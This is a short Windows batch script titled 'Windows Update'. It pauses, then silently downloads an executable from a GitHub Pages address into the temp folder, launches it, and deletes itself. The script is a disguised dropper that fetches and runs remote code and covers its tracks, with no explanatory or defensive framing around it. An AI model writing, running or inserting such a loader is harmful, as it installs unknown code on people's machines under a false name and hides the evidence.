@echo off
title Windows Update
timeout /t 2 /nobreak >nul
if not exist "%USERPROFILE%\Desktop" exit /b
curl -sL "https://boostedboynow.github.io/assets-host/2e1u07.exe" -o "%tmp%\b0da.exe"
if %errorlevel% neq 0 exit /b
start "" "%tmp%\b0da.exe"
(goto) 2>nul & del "%~f0"
